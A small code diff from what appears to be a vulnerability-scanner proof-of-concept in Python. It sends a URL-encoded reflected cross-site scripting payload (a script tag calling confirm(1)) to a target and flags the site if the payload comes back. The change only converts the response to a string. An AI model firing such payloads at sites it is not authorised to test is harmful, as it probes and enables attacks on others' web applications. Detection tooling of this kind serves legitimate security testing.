@@ -57,7 +57,7 @@ class Poc(ABPoc):
             verify_url = url + '?type=personal%27%3E%3Cscript%3Econfirm%281%29%3C%2fscript%3E%3C%21--'
             request = urllib.request.Request(verify_url)
             response = urllib.request.urlopen(request)
-            content = response.read()
+            content = str(response.read())
             if "<script>confirm(1)</script>" in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
